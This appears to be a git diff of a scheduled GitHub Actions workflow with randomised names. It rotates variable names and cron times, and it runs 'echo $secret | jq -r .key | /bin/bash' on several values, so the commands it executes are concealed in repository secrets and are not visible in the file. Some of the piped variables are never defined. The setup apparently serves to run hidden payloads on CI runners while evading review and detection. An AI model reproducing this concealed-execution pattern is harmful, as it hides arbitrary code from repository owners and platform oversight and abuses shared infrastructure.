@@ -2,8 +2,8 @@ name: mifadong6418
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
-jobs:  # 21741
+    - cron: '34 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,10 +11,10 @@ jobs:  # 21741
       - uses: actions/checkout@v4
       - name: mifadong6418
         env:
-          l087: ${{ secrets.l087 }}
+          pie494: ${{ secrets.pie494 }}
         run: |
-          echo $l087 | jq -r .v627 | /bin/bash
-          echo $t1 | jq -r .wdhtw53 | /bin/bash
-          echo $f94 | jq -r .wcv194 | /bin/bash
-          echo $fe5392 | jq -r .c1376 | /bin/bash
+          echo $pie494 | jq -r .jv750 | /bin/bash
+          echo $qyl1433 | jq -r .a35 | /bin/bash
+          echo $t06 | jq -r .k0612 | /bin/bash
+          echo $b639 | jq -r .hmpyq5 | /bin/bash
 
